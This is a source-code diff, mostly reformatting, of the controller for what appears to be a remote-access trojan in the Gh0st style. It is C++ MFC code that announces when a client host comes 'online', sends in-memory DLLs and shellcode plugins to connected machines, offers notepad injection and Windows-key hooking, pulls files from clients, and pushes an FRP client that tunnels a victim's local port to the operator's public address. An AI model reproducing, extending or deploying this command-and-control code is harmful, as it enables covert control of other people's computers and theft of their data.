@@ -330,22 +330,22 @@ DllInfo* ReadTinyRunDll(int pid)
 
 DllInfo* ReadFrpcDll()
 {
-	std::string name = FRPC_DLL_NAME;
-	DWORD fileSize = 0;
-	BYTE* dllData = ReadResource(IDR_BINARY_FRPC, fileSize);
-	// 设置输出参数
-	auto md5 = CalcMD5FromBytes(dllData, fileSize);
-	DllExecuteInfoNew info = { MEMORYDLL, fileSize, CALLTYPE_FRPC_CALL };
-	memcpy(info.Name, name.c_str(), name.length());
-	memcpy(info.Md5, md5.c_str(), md5.length());
-	BYTE* buffer = new BYTE[1 + sizeof(DllExecuteInfoNew) + fileSize];
-	buffer[0] = CMD_EXECUTE_DLL_NEW;
-	memcpy(buffer + 1, &info, sizeof(DllExecuteInfoNew));
-	memcpy(buffer + 1 + sizeof(DllExecuteInfoNew), dllData, fileSize);
-	Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfoNew) + fileSize, 0, md5);
-	SAFE_DELETE_ARRAY(dllData);
-	SAFE_DELETE_ARRAY(buffer);
-	return new DllInfo{ name, buf };
+    std::string name = FRPC_DLL_NAME;
+    DWORD fileSize = 0;
+    BYTE* dllData = ReadResource(IDR_BINARY_FRPC, fileSize);
+    // 设置输出参数
+    auto md5 = CalcMD5FromBytes(dllData, fileSize);
+    DllExecuteInfoNew info = { MEMORYDLL, fileSize, CALLTYPE_FRPC_CALL };
+    memcpy(info.Name, name.c_str(), name.length());
+    memcpy(info.Md5, md5.c_str(), md5.length());
+    BYTE* buffer = new BYTE[1 + sizeof(DllExecuteInfoNew) + fileSize];
+    buffer[0] = CMD_EXECUTE_DLL_NEW;
+    memcpy(buffer + 1, &info, sizeof(DllExecuteInfoNew));
+    memcpy(buffer + 1 + sizeof(DllExecuteInfoNew), dllData, fileSize);
+    Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfoNew) + fileSize, 0, md5);
+    SAFE_DELETE_ARRAY(dllData);
+    SAFE_DELETE_ARRAY(buffer);
+    return new DllInfo{ name, buf };
 }
 
 std::vector<DllInfo*> ReadAllDllFilesWindows(const std::string& dirPath)
@@ -605,10 +605,10 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_ONLINE_INJ_NOTEPAD, &CMy2015RemoteDlg::OnOnlineInjNotepad)
     ON_COMMAND(ID_PARAM_LOGIN_NOTIFY, &CMy2015RemoteDlg::OnParamLoginNotify)
     ON_COMMAND(ID_PARAM_ENABLE_LOG, &CMy2015RemoteDlg::OnParamEnableLog)
-        ON_COMMAND(ID_PROXY_PORT, &CMy2015RemoteDlg::OnProxyPort)
-        ON_COMMAND(ID_HOOK_WIN, &CMy2015RemoteDlg::OnHookWin)
-        ON_COMMAND(ID_RUNAS_SERVICE, &CMy2015RemoteDlg::OnRunasService)
-        END_MESSAGE_MAP()
+    ON_COMMAND(ID_PROXY_PORT, &CMy2015RemoteDlg::OnProxyPort)
+    ON_COMMAND(ID_HOOK_WIN, &CMy2015RemoteDlg::OnHookWin)
+    ON_COMMAND(ID_RUNAS_SERVICE, &CMy2015RemoteDlg::OnRunasService)
+END_MESSAGE_MAP()
 
 
 // CMy2015RemoteDlg 消息处理程序
@@ -847,8 +847,8 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
     std::string tip = flag ? " (" + v[RES_CLIENT_PUBIP] + ") " : "";
     ShowMessage("操作成功",strIP + tip.c_str() + "主机上线[" + loc + "]");
 
-	CharMsg *title =  new CharMsg("主机上线");
-	CharMsg *text = new CharMsg(strIP + CString(tip.c_str()) + _T(" 主机上线 [") + loc + _T("]"));
+    CharMsg *title =  new CharMsg("主机上线");
+    CharMsg *text = new CharMsg(strIP + CString(tip.c_str()) + _T(" 主机上线 [") + loc + _T("]"));
     LeaveCriticalSection(&m_cs);
     Mprintf("主机[%s]上线: %s\n", v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(),
             std::to_string(id).c_str());
@@ -861,7 +861,8 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
     }
 }
 
-LRESULT CMy2015RemoteDlg::OnShowNotify(WPARAM wParam, LPARAM lParam) {
+LRESULT CMy2015RemoteDlg::OnShowNotify(WPARAM wParam, LPARAM lParam)
+{
     CharMsg* title = (CharMsg*)wParam, * text = (CharMsg*)lParam;
 
     if (::IsWindow(m_Nid.hWnd)) {
@@ -875,8 +876,8 @@ LRESULT CMy2015RemoteDlg::OnShowNotify(WPARAM wParam, LPARAM lParam) {
         Shell_NotifyIcon(NIM_MODIFY, &nidCopy);
         SetTimer(TIMER_CLEAR_BALLOON, nidCopy.uTimeout, nullptr);
     }
-	if (title->needFree) delete title;
-	if (text->needFree) delete text;
+    if (title->needFree) delete title;
+    if (text->needFree) delete text;
     return S_OK;
 }
 
@@ -1286,7 +1287,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
     m_bHookWIN = THIS_CFG.GetInt("settings", "HookWIN", 0);
     SubMenu->CheckMenuItem(ID_HOOK_WIN, m_bHookWIN ? MF_CHECKED : MF_UNCHECKED);
-	m_runNormal = THIS_CFG.GetInt("settings", "RunNormal", 0);
+    m_runNormal = THIS_CFG.GetInt("settings", "RunNormal", 0);
     SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, !m_runNormal ? MF_CHECKED : MF_UNCHECKED);
     std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
     std::string str = myMap[n];
@@ -1573,8 +1574,7 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
     if (nIDEvent == TIMER_CLOSEWND) {
         DeletePopupWindow();
     }
-    if (nIDEvent == TIMER_CLEAR_BALLOON)
-    {
+    if (nIDEvent == TIMER_CLEAR_BALLOON) {
         KillTimer(TIMER_CLEAR_BALLOON);
 
         // 清除气球通知
@@ -2317,9 +2317,9 @@ bool SendData(void* user, FileChunkPacket* chunk, BYTE* data, int size)
     if (!ctx->Send2Client(data, size)) {
         return false;
     }
-	CDlgFileSend* dlg = (CDlgFileSend*)ctx->hDlg;
+    CDlgFileSend* dlg = (CDlgFileSend*)ctx->hDlg;
     BYTE* name = data + sizeof(FileChunkPacket);
-	dlg->UpdateProgress(CString((char*)name, chunk->nameLength), chunk);
+    dlg->UpdateProgress(CString((char*)name, chunk->nameLength), chunk);
 
     return true;
 }
@@ -2328,7 +2328,7 @@ void delay_cancel(CONTEXT_OBJECT* ctx, int sec)
 {
     if (!ctx) return;
     CDlgFileSend* dlg = (CDlgFileSend*)ctx->hDlg;
-	dlg->FinishFileSend(TRUE);
+    dlg->FinishFileSend(TRUE);
     Sleep(sec*1000);
     dlg->PostMessageA(WM_CLOSE);
     ctx->hDlg = NULL;
@@ -2346,7 +2346,7 @@ BOOL CMy2015RemoteDlg::AuthorizeClient(const std::string& sn, const std::string&
 {
     if (sn.empty() || passcode.empty() || hmac == 0) {
         return FALSE;
-	}
+    }
     static const char* superAdmin = getenv("YAMA_PWD");
     std::string pwd = superAdmin ? superAdmin : m_superPass;
     return VerifyMessage(pwd, (BYTE*)passcode.c_str(), passcode.length(), hmac);
@@ -2355,22 +2355,20 @@ BOOL CMy2015RemoteDlg::AuthorizeClient(const std::string& sn, const std::string&
 // 从char数组解析出多个路径
 std::vector<std::string> ParseMultiStringPath(const char* buffer, size_t size)
 {
-	std::vector<std::string> paths;
+    std::vector<std::string> paths;
 
-	const char* p = buffer;
-	const char* end = buffer + size;
+    const char* p = buffer;
+    const char* end = buffer + size;
 
-	while (p < end)
-	{
-		size_t len = strlen(p);
-		if (len > 0)
-		{
-			paths.emplace_back(p, len);
-		}
-		p += len + 1;
-	}
+    while (p < end) {
+        size_t len = strlen(p);
+        if (len > 0) {
+            paths.emplace_back(p, len);
+        }
+        p += len + 1;
+    }
 
-	return paths;
+    return paths;
 }
 
 VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
@@ -2406,7 +2404,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
                 valid = (hash256 == fixedKey);
             }
             if (valid) {
-				valid = AuthorizeClient(sn, passcode, hmac);
+                valid = AuthorizeClient(sn, passcode, hmac);
                 if (valid) {
                     Mprintf("%s 校验成功, HMAC 校验成功: %s\n", passcode.c_str(), sn.c_str());
                     std::string tip = passcode + " 校验成功: " + sn;
@@ -2429,20 +2427,20 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
     }
     case COMMAND_GET_FILE: {
         // 发送文件
-		std::string dir = (char*)(szBuffer + 1);
-		char* ptr = (char*)szBuffer + 1 + dir.length() + 1;
+        std::string dir = (char*)(szBuffer + 1);
+        char* ptr = (char*)szBuffer + 1 + dir.length() + 1;
         auto md5 = CalcMD5FromBytes((BYTE*)ptr, len - 2 - dir.length());
         if (!m_CmdList.PopCmd(md5)) {
             Mprintf("【警告】文件传输指令非法或已过期: %s\n", md5.c_str());
             ContextObject->CancelIO();
             break;
         }
-        auto files = *ptr ? ParseMultiStringPath(ptr, len - 2 - dir.length()) : std::vector<std::string>{};
+        auto files = *ptr ? ParseMultiStringPath(ptr, len - 2 - dir.length()) : std::vector<std::string> {};
         if (!files.empty()) {
-			CDlgFileSend* dlg = new CDlgFileSend(this, ContextObject->GetServer(), ContextObject, TRUE);
-			dlg->Create(IDD_DIALOG_FILESEND, GetDesktopWindow());
-			dlg->ShowWindow(SW_HIDE);
-			ContextObject->hDlg = dlg;
+            CDlgFileSend* dlg = new CDlgFileSend(this, ContextObject->GetServer(), ContextObject, TRUE);
+            dlg->Create(IDD_DIALOG_FILESEND, GetDesktopWindow());
+            dlg->ShowWindow(SW_HIDE);
+            ContextObject->hDlg = dlg;
             std::string hash = GetPwdHash(), hmac = GetHMAC(100);
             std::thread(FileBatchTransferWorker, files, dir, ContextObject, SendData, FinishSend,
                         hash, hmac).detach();
@@ -2460,7 +2458,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
             ContextObject->hDlg = dlg;
         }
         DialogBase* dlg = (DialogBase*)ContextObject->hDlg;
-		dlg->OnReceiveComplete();
+        dlg->OnReceiveComplete();
 
         break;
     }
@@ -2518,39 +2516,38 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
         break;
     }
     case CMD_EXECUTE_DLL: { // 请求DLL（执行代码）【L】
-    case CMD_EXECUTE_DLL_NEW:
-        DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
-        if (std::string(info->Name) == TINY_DLL_NAME) {
-            auto tinyRun = ReadTinyRunDll(info->Pid);
-            Buffer* buf = tinyRun->Data;
-            ContextObject->Send2Client(buf->Buf(), tinyRun->Data->length());
-            SAFE_DELETE(tinyRun);
-            break;
-        }
-        else if (std::string(info->Name) == FRPC_DLL_NAME) {
-			auto frpc = ReadFrpcDll();
-			Buffer* buf = frpc->Data;
-			ContextObject->Send2Client(buf->Buf(), frpc->Data->length());
-			SAFE_DELETE(frpc);
-			break;
-        }
-        for (std::vector<DllInfo*>::const_iterator i=m_DllList.begin(); i!=m_DllList.end(); ++i) {
-            DllInfo* dll = *i;
-            if (dll->Name == info->Name) {
-                // TODO 如果是UDP，发送大包数据基本上不可能成功
-                ContextObject->Send2Client(dll->Data->Buf(), dll->Data->length());
+        case CMD_EXECUTE_DLL_NEW:
+            DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
+            if (std::string(info->Name) == TINY_DLL_NAME) {
+                auto tinyRun = ReadTinyRunDll(info->Pid);
+                Buffer* buf = tinyRun->Data;
+                ContextObject->Send2Client(buf->Buf(), tinyRun->Data->length());
+                SAFE_DELETE(tinyRun);
+                break;
+            } else if (std::string(info->Name) == FRPC_DLL_NAME) {
+                auto frpc = ReadFrpcDll();
+                Buffer* buf = frpc->Data;
+                ContextObject->Send2Client(buf->Buf(), frpc->Data->length());
+                SAFE_DELETE(frpc);
                 break;
             }
+            for (std::vector<DllInfo*>::const_iterator i=m_DllList.begin(); i!=m_DllList.end(); ++i) {
+                DllInfo* dll = *i;
+                if (dll->Name == info->Name) {
+                    // TODO 如果是UDP，发送大包数据基本上不可能成功
+                    ContextObject->Send2Client(dll->Data->Buf(), dll->Data->length());
+                    break;
+                }
+            }
+            auto dll = ReadPluginDll(PluginPath() + "\\" + info->Name, { SHELLCODE, 0, CALLTYPE_DEFAULT, {}, {}, info->Pid, info->Is32Bit });
+            if (dll) {
+                Buffer* buf = dll->Data;
+                ContextObject->Send2Client(buf->Buf(), dll->Data->length());
+                SAFE_DELETE(dll);
+            }
+            Sleep(20);
+            break;
         }
-        auto dll = ReadPluginDll(PluginPath() + "\\" + info->Name, { SHELLCODE, 0, CALLTYPE_DEFAULT, {}, {}, info->Pid, info->Is32Bit });
-        if (dll) {
-            Buffer* buf = dll->Data;
-            ContextObject->Send2Client(buf->Buf(), dll->Data->length());
-            SAFE_DELETE(dll);
-        }
-        Sleep(20);
-        break;
-    }
     case COMMAND_PROXY: { // 代理映射【x】
         g_2015RemoteDlg->SendMessage(WM_OPENPROXYDIALOG, 0, (LPARAM)ContextObject);
         break;
@@ -2783,14 +2780,14 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
     // 回复心跳
     // if(0)
     {
-		BOOL authorized = AuthorizeClient(hb.SN, hb.Passcode, hb.PwdHmac);
-		if (authorized) {
-			Mprintf("%s HMAC 校验成功: %lld\n", hb.Passcode, hb.PwdHmac);
-			std::string tip = std::string(hb.Passcode) + " 授权成功: ";
-			tip += std::to_string(hb.PwdHmac) + "[" + std::string(ctx->GetClientData(ONLINELIST_IP)) + "]";
-			CharMsg* msg = new CharMsg(tip.c_str());
-			PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
-		}
+        BOOL authorized = AuthorizeClient(hb.SN, hb.Passcode, hb.PwdHmac);
+        if (authorized) {
+            Mprintf("%s HMAC 校验成功: %lld\n", hb.Passcode, hb.PwdHmac);
+            std::string tip = std::string(hb.Passcode) + " 授权成功: ";
+            tip += std::to_string(hb.PwdHmac) + "[" + std::string(ctx->GetClientData(ONLINELIST_IP)) + "]";
+            CharMsg* msg = new CharMsg(tip.c_str());
+            PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
+        }
         HeartbeatACK ack = { hb.Time, (char)authorized };
         BYTE buf[sizeof(HeartbeatACK) + 1] = { CMD_HEARTBEAT_ACK};
         memcpy(buf + 1, &ack, sizeof(HeartbeatACK));
@@ -3171,33 +3168,31 @@ char* ReadFileToBuffer(const std::string &path, size_t& outSize)
 
 BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size, LONGLONG offset)
 {
-	std::string filePath = path;
-	std::fstream outFile;
+    std::string filePath = path;
+    std::fstream outFile;
 
-	if (offset == 0) {
-		// offset=0 时截断文件，等同覆盖写入
-		outFile.open(filePath, std::ios::binary | std::ios::out | std::ios::trunc);
-	}
-	else if (offset == -1) {
-		// offset=-1 时追加写入
-		outFile.open(filePath, std::ios::binary | std::ios::out | std::ios::app);
-	}
-	else {
-		// 非0偏移，保留原内容，定位写入
-		outFile.open(filePath, std::ios::binary | std::ios::in | std::ios::out);
+    if (offset == 0) {
+        // offset=0 时截断文件，等同覆盖写入
+        outFile.open(filePath, std::ios::binary | std::ios::out | std::ios::trunc);
+    } else if (offset == -1) {
+        // offset=-1 时追加写入
+        outFile.open(filePath, std::ios::binary | std::ios::out | std::ios::app);
+    } else {
+        // 非0偏移，保留原内容，定位写入
+        outFile.open(filePath, std::ios::binary | std::ios::in | std::ios::out);
 
-		// 文件不存在时创建
-		if (!outFile) {
-			outFile.open(filePath, std::ios::binary | std::ios::out);
-		}
-	}
+        // 文件不存在时创建
+        if (!outFile) {
+            outFile.open(filePath, std::ios::binary | std::ios::out);
+        }
+    }
 
-	if (!outFile) {
-		Mprintf("Failed to open or create the file: %s.\n", filePath.c_str());
-		return FALSE;
-	}
+    if (!outFile) {
+        Mprintf("Failed to open or create the file: %s.\n", filePath.c_str());
+        return FALSE;
+    }
 
-	// 追加模式不需要 seekp, 其他情况定位到指定位置
+    // 追加模式不需要 seekp, 其他情况定位到指定位置
     if (offset != -1) {
         // 定位到指定位置
         outFile.seekp(offset, std::ios::beg);
@@ -3210,20 +3205,19 @@ BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size, LONGL
         }
     }
 
-	// 写入二进制数据
-	outFile.write(data, size);
+    // 写入二进制数据
+    outFile.write(data, size);
 
-	if (outFile.good()) {
-		Mprintf("Binary data written successfully to %s.\n", filePath.c_str());
-	}
-	else {
-		Mprintf("Failed to write data to file.\n");
-		outFile.close();
-		return FALSE;
-	}
+    if (outFile.good()) {
+        Mprintf("Binary data written successfully to %s.\n", filePath.c_str());
+    } else {
+        Mprintf("Failed to write data to file.\n");
+        outFile.close();
+        return FALSE;
+    }
 
-	outFile.close();
-	return TRUE;
+    outFile.close();
+    return TRUE;
 }
 
 int run_cmd(std::string cmdLine)
@@ -4289,74 +4283,74 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
         do {
             static CDialogBase* operateWnd = nullptr;
             KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
-			// 先判断是否需要处理的热键
-			bool bNeedCheck = false;
-			if (wParam == WM_SYSKEYDOWN || wParam == WM_SYSKEYUP) {
-				// 所有系统键都需要检查
-				bNeedCheck = true;
-			}
-			// Win 键 (开始菜单、Win+D/E/R/L 等)
-			else if (pKey->vkCode == VK_LWIN || pKey->vkCode == VK_RWIN) {
-				bNeedCheck = true;
-			}
-			// Alt+Tab (切换窗口)
-			else if (pKey->vkCode == VK_TAB && (pKey->flags & LLKHF_ALTDOWN)) {
-				bNeedCheck = true;
-			}
-			// Alt+Esc (循环切换窗口)
-			else if (pKey->vkCode == VK_ESCAPE && (pKey->flags & LLKHF_ALTDOWN)) {
-				bNeedCheck = true;
-			}
-			// Ctrl+Shift+Esc (任务管理器)
-			else if (pKey->vkCode == VK_ESCAPE &&
-				(GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
-				(GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
-				bNeedCheck = true;
-			}
-			// Ctrl+Esc (开始菜单)
-			else if (pKey->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
-				bNeedCheck = true;
-			}
-			// F12 (调试器热键)
-			else if (pKey->vkCode == VK_F12 || pKey->vkCode == VK_F10) {
-				bNeedCheck = true;
-			}
-			// Print Screen (截图)
-			else if (pKey->vkCode == VK_SNAPSHOT) {
-				bNeedCheck = true;
-			}
-			// Win+Tab (任务视图)
-			else if (pKey->vkCode == VK_TAB &&
-				(GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000)) {
-				bNeedCheck = true;
-			}
-			if (bNeedCheck && g_2015RemoteDlg->m_bHookWIN) {
+            // 先判断是否需要处理的热键
+            bool bNeedCheck = false;
+            if (wParam == WM_SYSKEYDOWN || wParam == WM_SYSKEYUP) {
+                // 所有系统键都需要检查
+                bNeedCheck = true;
+            }
+            // Win 键 (开始菜单、Win+D/E/R/L 等)
+            else if (pKey->vkCode == VK_LWIN || pKey->vkCode == VK_RWIN) {
+                bNeedCheck = true;
+            }
+            // Alt+Tab (切换窗口)
+            else if (pKey->vkCode == VK_TAB && (pKey->flags & LLKHF_ALTDOWN)) {
+                bNeedCheck = true;
+            }
+            // Alt+Esc (循环切换窗口)
+            else if (pKey->vkCode == VK_ESCAPE && (pKey->flags & LLKHF_ALTDOWN)) {
+                bNeedCheck = true;
+            }
+            // Ctrl+Shift+Esc (任务管理器)
+            else if (pKey->vkCode == VK_ESCAPE &&
+                     (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
+                     (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
+                bNeedCheck = true;
+            }
+            // Ctrl+Esc (开始菜单)
+            else if (pKey->vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
+                bNeedCheck = true;
+            }
+            // F12 (调试器热键)
+            else if (pKey->vkCode == VK_F12 || pKey->vkCode == VK_F10) {
+                bNeedCheck = true;
+            }
+            // Print Screen (截图)
+            else if (pKey->vkCode == VK_SNAPSHOT) {
+                bNeedCheck = true;
+            }
+            // Win+Tab (任务视图)
+            else if (pKey->vkCode == VK_TAB &&
+                     (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000)) {
+                bNeedCheck = true;
+            }
+            if (bNeedCheck && g_2015RemoteDlg->m_bHookWIN) {
                 HWND hFore = ::GetForegroundWindow();
-				auto screen = (CScreenSpyDlg*)g_2015RemoteDlg->GetRemoteWindow(hFore);
+                auto screen = (CScreenSpyDlg*)g_2015RemoteDlg->GetRemoteWindow(hFore);
                 if (screen && screen->m_bIsCtrl) {
-					MSG msg = { 0 };
-					msg.hwnd = hFore;
-					msg.message = (UINT)wParam;
-					msg.wParam = pKey->vkCode;
-					msg.lParam = (pKey->scanCode << 16) | 1;
+                    MSG msg = { 0 };
+                    msg.hwnd = hFore;
+                    msg.message = (UINT)wParam;
+                    msg.wParam = pKey->vkCode;
+                    msg.lParam = (pKey->scanCode << 16) | 1;
 
-					if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
-						msg.lParam |= (1 << 31) | (1 << 30);
-					}
+                    if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
+                        msg.lParam |= (1 << 31) | (1 << 30);
+                    }
 
-					// 扩展键标志 (bit 24)
-					if (pKey->flags & LLKHF_EXTENDED) {
-						msg.lParam |= (1 << 24);
-					}
+                    // 扩展键标志 (bit 24)
+                    if (pKey->flags & LLKHF_EXTENDED) {
+                        msg.lParam |= (1 << 24);
+                    }
 
-					msg.time = pKey->time;
-					msg.pt.x = 0;
-					msg.pt.y = 0;
+                    msg.time = pKey->time;
+                    msg.pt.x = 0;
+                    msg.pt.y = 0;
                     screen->SendScaledMouseMessage(&msg, false);
-					// 返回 1 阻止本地系统处理
-					return 1;
+                    // 返回 1 阻止本地系统处理
+                    return 1;
                 }
-			}
+            }
             // 只在按下时处理
             if (wParam == WM_KEYDOWN) {
                 // 检测 Ctrl+C / Ctrl+X
@@ -4382,7 +4376,7 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
                         auto files = GetClipboardFiles(result);
                         if (!files.empty()) {
                             // 获取远程目录
-							auto str = BuildMultiStringPath(files);
+                            auto str = BuildMultiStringPath(files);
                             BYTE* szBuffer = new BYTE[81 + str.size()];
                             szBuffer[0] = { COMMAND_GET_FOLDER };
                             std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
@@ -4574,63 +4568,60 @@ void CMy2015RemoteDlg::OnParamEnableLog()
 
 bool IsDateGreaterOrEqual(const char* date1, const char* date2)
 {
-	const char* months[] = {
-		"Jan", "Feb", "Mar", "Apr", "May", "Jun",
-		"Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
-	};
+    const char* months[] = {
+        "Jan", "Feb", "Mar", "Apr", "May", "Jun",
+        "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
+    };
 
-	auto parseDate = [&months](const char* date, int& year, int& month, int& day) {
-		char mon[4] = { 0 };
-		sscanf(date, "%3s %d %d", mon, &day, &year);
-		month = 0;
-		for (int i = 0; i < 12; i++) {
-			if (strcmp(mon, months[i]) == 0) {
-				month = i + 1;
-				break;
-			}
-		}
-	};
+    auto parseDate = [&months](const char* date, int& year, int& month, int& day) {
+        char mon[4] = { 0 };
+        sscanf(date, "%3s %d %d", mon, &day, &year);
+        month = 0;
+        for (int i = 0; i < 12; i++) {
+            if (strcmp(mon, months[i]) == 0) {
+                month = i + 1;
+                break;
+            }
+        }
+    };
 
-	int y1, m1, d1, y2, m2, d2;
-	parseDate(date1, y1, m1, d1);
-	parseDate(date2, y2, m2, d2);
+    int y1, m1, d1, y2, m2, d2;
+    parseDate(date1, y1, m1, d1);
+    parseDate(date2, y2, m2, d2);
 
-	if (y1 != y2) return y1 >= y2;
-	if (m1 != m2) return m1 >= m2;
-	return d1 >= d2;
+    if (y1 != y2) return y1 >= y2;
+    if (m1 != m2) return m1 >= m2;
+    return d1 >= d2;
 }
 
 std::string GetAuthKey(const char* token, long long timestamp)
 {
-	char tsStr[32];
-	sprintf_s(tsStr, "%lld", timestamp);
+    char tsStr[32];
+    sprintf_s(tsStr, "%lld", timestamp);
 
-	HCRYPTPROV hProv = 0;
-	HCRYPTHASH hHash = 0;
-	std::string result;
+    HCRYPTPROV hProv = 0;
+    HCRYPTHASH hHash = 0;
+    std::string result;
 
-	if (CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
-	{
-		if (CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
-		{
-			CryptHashData(hHash, (BYTE*)token, (DWORD)strlen(token), 0);
-			CryptHashData(hHash, (BYTE*)tsStr, (DWORD)strlen(tsStr), 0);
+    if (CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+        if (CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
+            CryptHashData(hHash, (BYTE*)token, (DWORD)strlen(token), 0);
+            CryptHashData(hHash, (BYTE*)tsStr, (DWORD)strlen(tsStr), 0);
 
-			BYTE hash[16];
-			DWORD cbHash = sizeof(hash);
-			if (CryptGetHashParam(hHash, HP_HASHVAL, hash, &cbHash, 0))
-			{
-				char hex[33];
-				for (int i = 0; i < 16; i++)
-					sprintf_s(hex + i * 2, 3, "%02x", hash[i]);
-				result = hex;
-			}
-			CryptDestroyHash(hHash);
-		}
-		CryptReleaseContext(hProv, 0);
-	}
+            BYTE hash[16];
+            DWORD cbHash = sizeof(hash);
+            if (CryptGetHashParam(hHash, HP_HASHVAL, hash, &cbHash, 0)) {
+                char hex[33];
+                for (int i = 0; i < 16; i++)
+                    sprintf_s(hex + i * 2, 3, "%02x", hash[i]);
+                result = hex;
+            }
+            CryptDestroyHash(hHash);
+        }
+        CryptReleaseContext(hProv, 0);
+    }
 
-	return result;
+    return result;
 }
 
 // 基于FRP将客户端端口代理到主控程序的公网
@@ -4646,66 +4637,65 @@ void CMy2015RemoteDlg::OnProxyPort()
     }
     CInputDialog dlg(this);
     dlg.Init("代理端口", "请输入客户端端口:");
-	if (IDOK != dlg.DoModal() || atoi(dlg.m_str) <= 0 || atoi(dlg.m_str) >= 65536) {
-		return;
-	}
+    if (IDOK != dlg.DoModal() || atoi(dlg.m_str) <= 0 || atoi(dlg.m_str) >= 65536) {
+        return;
+    }
     uint64_t timestamp = time(nullptr);
     std::string key = GetAuthKey(pwd.c_str(), timestamp);
-	int serverPort = THIS_CFG.GetInt("frp", "server_port", 7000);
+    int serverPort = THIS_CFG.GetInt("frp", "server_port", 7000);
     int localPort = atoi(dlg.m_str);
-	auto frpc = ReadFrpcDll();
+    auto frpc = ReadFrpcDll();
     FrpcParam param(key.c_str(), timestamp, ip.c_str(), serverPort, localPort, localPort);
-	EnterCriticalSection(&m_cs);
-	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
-	BOOL sent = FALSE;
-	while (Pos) {
-		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-		context* ctx = (context*)m_CList_Online.GetItemData(iItem);
-		if (!ctx->IsLogin())
-			continue;
+    EnterCriticalSection(&m_cs);
+    POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+    BOOL sent = FALSE;
+    while (Pos) {
+        int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
+        context* ctx = (context*)m_CList_Online.GetItemData(iItem);
+        if (!ctx->IsLogin())
+            continue;
         CString date = ctx->GetClientData(ONLINELIST_VERSION);
-		if (IsDateGreaterOrEqual(date, "Dec 22 2025")) {
-			Buffer* buf = frpc->Data;
+        if (IsDateGreaterOrEqual(date, "Dec 22 2025")) {
+            Buffer* buf = frpc->Data;
             BYTE cmd[1 + sizeof(DllExecuteInfoNew)] = {0};
             memcpy(cmd, buf->Buf(), 1 + sizeof(DllExecuteInfoNew));
             DllExecuteInfoNew* p = (DllExecuteInfoNew*)(cmd + 1);
             SetParameters(p, (char*)&param, sizeof(param));
-			ctx->Send2Client(cmd, 1 + sizeof(DllExecuteInfoNew));
-			sent = TRUE;
-        }
-        else {
-            PostMessageA(WM_SHOWNOTIFY, (WPARAM)new CharMsg("版本不支持"), 
-                (LPARAM)new CharMsg("客户端版本最低要求: " + CString("Dec 22 2025")));
+            ctx->Send2Client(cmd, 1 + sizeof(DllExecuteInfoNew));
+            sent = TRUE;
+        } else {
+            PostMessageA(WM_SHOWNOTIFY, (WPARAM)new CharMsg("版本不支持"),
+                         (LPARAM)new CharMsg("客户端版本最低要求: " + CString("Dec 22 2025")));
         }
         break;
-	}
-	LeaveCriticalSection(&m_cs);
-	SAFE_DELETE(frpc);
+    }
+    LeaveCriticalSection(&m_cs);
+    SAFE_DELETE(frpc);
     if (sent)
-        MessageBoxA(CString("请通过") + ip.c_str() + ":" + std::to_string(localPort).c_str() + "访问代理端口!", 
-            "提示", MB_ICONINFORMATION);
